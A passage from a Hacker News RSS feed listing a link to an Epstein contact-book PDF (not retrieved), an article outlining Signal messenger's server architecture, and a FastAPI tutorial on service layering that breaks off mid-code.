            <guid isPermaLink="false">hacker-news-small-sites-25798008</guid>
            <pubDate>Fri, 15 Jan 2021 23:25:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Jeffrey Epsteins Little Black-Book Unredacted [pdf]]]>
            </title>
            <description>
<![CDATA[
Score 60 | Comments 27 (<a href="https://news.ycombinator.com/item?id=25797773">thread link</a>) | @DyslexicAtheist
<br/>
January 15, 2021 | https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf | <a href="https://web.archive.org/web/*/https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://spidercatweb.blog/wp-content/uploads/2019/08/Jeffrey-Epsteins-Little-Black-Book-unredacted.pdf</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797773</guid>
            <pubDate>Fri, 15 Jan 2021 23:06:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Signal Messanger Architecture]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25797686">thread link</a>) | @aleyan
<br/>
January 15, 2021 | https://sorincocorada.ro/signal-messanger-architecture/ | <a href="https://web.archive.org/web/*/https://sorincocorada.ro/signal-messanger-architecture/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
						<p><strong>Introduction<br>
</strong><br>
<a href="https://signal.org/">Signal</a> is an end-to-end encrypted communications application for Android and iOS similar to WhatsApp but open source. It uses the TCP/IP (Internet) to send one-to-one and group messages, which can include text, files, voice notes, images and videos, and make one-to-one voice and video calls. For user identification standard cellular mobile numbers are used.</p>
<p><img src="https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1.png" alt="" width="1123" height="794" srcset="https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1.png 1123w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-300x212.png 300w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-768x543.png 768w, https://sorincocorada.ro/wp-content/uploads/2018/03/SignalArchitecture-1-1024x724.png 1024w" sizes="(max-width: 1123px) 100vw, 1123px"></p>

<p>The main system component is the Signal-Server which is maintained by Open Whisper Systems. The source code is available on GitHub (https://github.com/signalapp/Signal-Server) only for audition purposes without providing additional documentation about on premises installations. In the following sections I will provide some information about the system components and their interconnections.</p>
<p><strong>System components</strong></p>
<p><em>Signal-Server –</em> is the central element of the Signal Messenger ecosystem, being constantly developed by Open Whisper Systems. It manages the registration of new accounts, stores and distributes the public keys of the clients, relays and temporarily stores&nbsp; the end-to end encrypted messages, enforces rate limits in order to avoid denial of service attacks and provides pre-signed URLs to the mobile client for uploading files. Signal-Server is entirely written in Java; source code is available at the following URL: https://github.com/signalapp/Signal-Server .&nbsp; An additional <a href="https://www.postgresql.org/" target="_blank" rel="noopener">PostgreSQL</a> database and<a href="https://redis.io/" target="_blank" rel="noopener"> Redis</a> NoSQL object store are needed in order to run the Signal-Server. The configuration is stored in a yml file (at a first glance it seems quite complex) and is passed as a command line argument to the java binaries. Before running Signal-Server the Push-Server must be up and running.</p>
<p><em>Push-Server</em> – acts as a gateway between Signal-Server and Google Cloud Messaging / Apple Push Notification Service. It is entirely written in Java and the configuration is sored in a yml file which must be passed as an command line argument to the java binaries. Source code is available at&nbsp;https://github.com/signalapp/PushServer . Without the push service the App has to be permanently connected to the Signal-Server in order to receive the messages, thus reducing the battery life of the mobile device or the user hast manually check for new messages by opening the App.</p>
<p><em>STUN/TURN Server –&nbsp;</em> is a VoIP media traffic NAT traversal server and gateway. It is used for establishing voice and video calls. For this component you can use a standard On-premises or Cloud TURN implementation, such as Linux Coturn (https://github.com/coturn/coturn) which is available as a standard package on the majority of Linux distributions. If you do not need voice/video calls this component can be omitted. <em><br>
</em></p>
<p><em>Signal App</em> – is the only visible part to the end user. It&nbsp; is developed and&nbsp; maintained by Open Whisper Systems. At the time of writing there is a Android and an iOS version. A desktop (Linux, Windows, Mac ) version is also available but it lacks registration and calling support, being more like an extension of the mobile App for desktop usage.</p>
<p><em>Twilio</em> – is a cloud communications platform. In this scenario it allows the Signal-Server to make phone calls and send&nbsp; text messages using its web service APIs. It is used only during the registration phase to confirm the users mobile phone number. Twilio’s services are accessed over HTTP and are billed based on usage.</p>
<p><em>Amazon S3 (Simple Storage Services)</em> – is a web service offered by Amazon Web Services (AWS). It is used to exchange encrypted files between the Signal clients. In contrast to the text messages which are relayed through the Signal-Server the files are temporarily stored using an external service. The protocol works as follows: the Signal client request an URL from Signal-Server, the server computes a <a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/PresignedUrlUploadObject.html">pre-signed URL</a> having a limited validity and sends it to the client, the client uploads the encrypted file to Amazon S3 and then sends the link to its peer. Amazon S3 services are accessed over HTTP and are billed based on usage. If you do not need file transfers this component can be omitted.</p>
<p><em>Google Cloud Messaging (GCM)</em> – is a mobile notification service developed by Google that enables Signal-Server to send notification data to Signal Apps that target the Android Operating System. GCM is a free service ant it is accessed over HTTP.</p>
<p><em>Apple Push Notification Service (APNs)</em> – is platform notification service created by Apple Inc. that enables the Signal-Server to send notification data to Signal Apps installed on Apple devices. APNs doesn’t cost anything.</p>
<p>In addition to the end-to-end encryption, the transport between the Signal App and the Signal-Server is secured using TLS and <a href="https://www.owasp.org/index.php/Certificate_and_Public_Key_Pinning">certificate pinning</a>. The Signal-Server implements a API protocol for communicating with the Signal Apps which is available at https://github.com/signalapp/Signal-Server/wiki/API-Protocol (document might be outdated).</p>
			<!-- <rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"
			xmlns:dc="http://purl.org/dc/elements/1.1/"
			xmlns:trackback="http://madskills.com/public/xml/rss/module/trackback/">
		<rdf:Description rdf:about="https://sorincocorada.ro/signal-messanger-architecture/"
    dc:identifier="https://sorincocorada.ro/signal-messanger-architecture/"
    dc:title="Signal Messanger Architecture"
    trackback:ping="https://sorincocorada.ro/signal-messanger-architecture/trackback/" />
</rdf:RDF> -->
						
		</div></div>]]>
            </description>
            <link>https://sorincocorada.ro/signal-messanger-architecture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25797686</guid>
            <pubDate>Fri, 15 Jan 2021 22:59:00 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Implementing FastAPI Services – Abstraction and Separation of Concerns]]>
            </title>
            <description>
<![CDATA[
Score 48 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25797140">thread link</a>) | @jdnier
<br/>
January 15, 2021 | https://camillovisini.com/article/abstracting-fastapi-services/ | <a href="https://web.archive.org/web/*/https://camillovisini.com/article/abstracting-fastapi-services/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-3d5c50e8=""><p data-v-3d5c50e8="">This article introduces an approach to structure FastAPI applications with multiple services in mind. The proposed structure decomposes the individual services into packages and modules, following principles of abstraction and separation of concerns. The code discussed below can also be studied in its entirety in a dedicated companion GitHub repository.</p>

<h2 id="fastapi--building-high-performing-python-apis" data-v-3d5c50e8="">FastAPI – Building High-performing Python APIs</h2>
<p data-v-3d5c50e8=""><a href="https://fastapi.tiangolo.com/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">FastAPI</a> is a fast, highly intuitive and well-documented API framework based on <a href="https://www.starlette.io/" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Starlette</a>. Despite being relatively new, it's gaining <a href="https://star-history.t9t.io/#tiangolo/fastapi" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">strong adoption</a> by the developer community – it is even already being adopted in production by corporates like <a href="https://netflixtechblog.com/introducing-dispatch-da4b8a2a8072" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Netflix</a> and <a href="https://github.com/tiangolo/fastapi/pull/26" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">Microsoft</a>.</p>
<p data-v-3d5c50e8="">Following the <a href="https://en.wikipedia.org/wiki/Unix_philosophy" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">UNIX philosophy</a> of <em data-v-3d5c50e8="">"doing one thing, and doing it well"</em>, separating parts of the application according to their task improves code readability and maintainability; ultimately reducing complexity. The main benefits of structuring applications in this way:</p>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Separation of concerns</strong> – Decomposing the application into modules performing a single job. This allows accepting requests (top down: controller → service → data access) and returning responses (bottom up: data access → service → controller) with a clear separation of what particular functionality should be implemented in which particular module, reducing cognitive load for development.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/6c6e6d1a9a2252c24c72049f74382abee765095c/9408a/_nuxt/img/request-response.df4b985.jpg" width="100%" height="" alt="Request-Response Flow across Application Layers" data-v-220acfa8=""></p><p data-v-220acfa8="">Request-Response Flow across Application Layers</p></div>
<p data-v-3d5c50e8=""><strong data-v-3d5c50e8="">Abstraction</strong> — Components of the application are designed in a reusable way. For instance, <code data-v-3d5c50e8="">ServiceResult</code> is implemented as a generic outcome of a service operation (which may be successful and return a response, or unsuccessful and raise an exception) able to be used by all services of the app, keeping code <a href="https://en.wikipedia.org/wiki/Don%27t_repeat_yourself" rel="nofollow noopener noreferrer" target="_blank" data-v-3d5c50e8="">DRY</a>.</p>
<div data-v-220acfa8="" data-v-3d5c50e8=""><p><img src="https://d33wubrfki0l68.cloudfront.net/fc6bd09df8db15e783bd11117eba8003350f04cc/465f4/_nuxt/img/directory-structure.0c63d71.jpg" width="100%" height="" alt="Directory Structure Overview" data-v-220acfa8=""></p><p data-v-220acfa8="">Directory Structure Overview</p></div>
<p data-v-3d5c50e8="">The granular nature of namespacing allow to distinguish parts of the application, e.g., routes versus business logic belonging to a particular service – grouping similar tasks together, while keeping distinct parts separated. Four principal packages are needed. For each service, one module is added to these four packages. For instance, a service called <em data-v-3d5c50e8="">"Foo"</em> requires the following modules (discussed in detail below):</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./routers/  foo.py </span><span data-v-3d5c50e8=""># Router instance and routes</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./services/ foo.py </span><span data-v-3d5c50e8=""># Business logic (including CRUD helpers)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./schemas/  foo.py </span><span data-v-3d5c50e8=""># Data "schemas" (e.g., Pydantic models)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">./models/   foo.py </span><span data-v-3d5c50e8=""># Database models (e.g., SQLAlchemy models)</span></span></code></pre></div>
<p data-v-3d5c50e8="">The four principal packages are complemented by two generic packages which contain application-specific (and not service-specific) functionality, such as configuration or utility functions.</p>
<h2 id="controller-layer--routes" data-v-3d5c50e8="">Controller Layer – Routes</h2>
<p data-v-3d5c50e8="">Within <code data-v-3d5c50e8="">main</code>, the application is instantiated and all routers are included. Additionally, middlewares and/or exception handlers are implemented. The example application discussed below is based on a service called <code data-v-3d5c50e8="">Foo</code>, which requires a number of routes. To handle custom exceptions occurring at the service layer, as instances of class <code data-v-3d5c50e8="">AppExceptionCase</code>, a respective exception handler is added to the application.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8=""># ...</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> fastapi </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> FastAPI</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">from</span><span data-v-3d5c50e8=""> routers </span><span data-v-3d5c50e8="">import</span><span data-v-3d5c50e8=""> foo</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">app </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FastAPI()</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">@app.exception_handler</span><span data-v-3d5c50e8="">(AppExceptionCase)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">custom_app_exception_handler</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">request</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> e</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">await</span><span data-v-3d5c50e8=""> app_exception_handler(request, e)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">app.include_router(foo.router)</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routers and their routes are defined in modules within the <code data-v-3d5c50e8="">routers</code> package. Each route instantiates the respective service and passes on the database session from the request dependency. Handled by <code data-v-3d5c50e8="">handle_result()</code>, the service result (either the requested data as the result of a successful operation, or an exception) is returned. In case of an exception, instead of (and before) returning any response, the app exception handler in <code data-v-3d5c50e8="">main</code> picks up handling the exception and returns a response.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">router </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> APIRouter(</span><span data-v-3d5c50e8="">prefix</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">"/foo"</span><span data-v-3d5c50e8="">)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">@router.post</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).create_item(item)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">@router.get</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">"/item/</span><span data-v-3d5c50e8="">{item_id}</span><span data-v-3d5c50e8="">"</span><span data-v-3d5c50e8="">, </span><span data-v-3d5c50e8="">response_model</span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8="">FooItem)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">async</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">get_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">item_id</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">int</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> get_db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> Depends()</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">    result </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> FooService(db).get_item(item_id)</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> handle_result(result)</span></span></code></pre></div>
<h2 id="service-result-class--success--exceptions" data-v-3d5c50e8="">Service Result Class – Success &amp; Exceptions</h2>
<p data-v-3d5c50e8="">The <code data-v-3d5c50e8="">ServiceResult</code> class defines a generic outcome of a service operation. In case the operation is successful, the outcome (or "value") is returned contained within the value attribute of the instance. In case of a custom app exception, the service result instance contains information about the raised exception (e.g., which status code should be returned to the client).</p>
<div data-v-3d5c50e8=""><div data-v-594b4fde="" data-v-3d5c50e8=""><pre data-v-594b4fde=""><span data-v-594b4fde=""><span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span> <span data-v-594b4fde="">⬤</span><span data-v-594b4fde=""><span data-v-594b4fde="">utils ›</span></span><span data-v-594b4fde="">service_result.py</span></span></pre></div><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> arg</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">isinstance</span><span data-v-3d5c50e8="">(arg, AppExceptionCase):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">False</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.exception_case</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg.status_code</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">else</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">8</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">True</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">9</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">10</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.status_code </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">None</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">11</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> arg</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">12</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__str__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">13</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">14</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"[Success]"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">15</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">'[Exception] "</span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">"'</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">16</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__repr__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">17</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">18</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">"&lt;ServiceResult Success&gt;"</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">19</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">f</span><span data-v-3d5c50e8="">"&lt;ServiceResult AppException </span><span data-v-3d5c50e8="">{</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.exception_case</span><span data-v-3d5c50e8="">}</span><span data-v-3d5c50e8="">&gt;"</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">20</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__enter__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">21</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.value</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">22</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__exit__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">*</span><span data-v-3d5c50e8="">kwargs</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">23</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">pass</span></span>


<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">24</span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">handle_result</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">result</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> ServiceResult</span><span data-v-3d5c50e8="">) -&gt; :</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">25</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">if</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">not</span><span data-v-3d5c50e8=""> result.success:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">26</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> exception:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">27</span><span data-v-3d5c50e8="">            </span><span data-v-3d5c50e8="">raise</span><span data-v-3d5c50e8=""> exception</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">28</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">with</span><span data-v-3d5c50e8=""> result </span><span data-v-3d5c50e8="">as</span><span data-v-3d5c50e8=""> result:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">29</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">return</span><span data-v-3d5c50e8=""> result</span></span></code></pre></div>
<h2 id="service-layer--business-logic" data-v-3d5c50e8="">Service Layer – Business Logic</h2>
<p data-v-3d5c50e8="">Services are defined in the <code data-v-3d5c50e8="">services</code> package. Each service is a subclass of <code data-v-3d5c50e8="">AppService</code>. The database session is passed down from the request dependency via an "interface-like" mixin utility class (other mixing classes may be added via multiple inheritance in order to extend available attributes).</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> DBSessionMixin</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">__init__</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> db</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> Session</span><span data-v-3d5c50e8="">):</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">3</span><span data-v-3d5c50e8="">        </span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">.db </span><span data-v-3d5c50e8="">=</span><span data-v-3d5c50e8=""> db</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">4</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppService(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">5</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span>

<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">6</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> AppCRUD(DBSessionMixin)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">7</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">pass</span></span></code></pre></div>
<p data-v-3d5c50e8="">Routes belonging to service <code data-v-3d5c50e8="">Foo</code> are connected to methods of <code data-v-3d5c50e8="">FooService</code>, which encapsulates all business logic of the service. The return value are of type <code data-v-3d5c50e8="">ServiceResult</code>: Containing a value attribute with returnable data or, in case of an exception, an <code data-v-3d5c50e8="">AppException</code>. In both cases, the respective result is returned back "upwards" to the controller layer.</p>
<div data-v-3d5c50e8=""><pre data-v-3d5c50e8=""><code data-v-3d5c50e8=""><span data-v-3d5c50e8=""><span data-v-3d5c50e8="">1</span><span data-v-3d5c50e8="">class</span><span data-v-3d5c50e8=""> FooService(AppService)</span><span data-v-3d5c50e8="">:</span></span>
<span data-v-3d5c50e8=""><span data-v-3d5c50e8="">2</span><span data-v-3d5c50e8="">    </span><span data-v-3d5c50e8="">def</span><span data-v-3d5c50e8=""> </span><span data-v-3d5c50e8="">create_item</span><span data-v-3d5c50e8="">(</span><span data-v-3d5c50e8="">self</span><span data-v-3d5c50e8="">,</span><span data-v-3d5c50e8=""> item</span><span data-v-3d5c50e8="">:</span><span data-v-3d5c50e8=""> FooItemCreate</span><span data-v-3d5c50e8="">) -&gt; ServiceResult:</span></span>
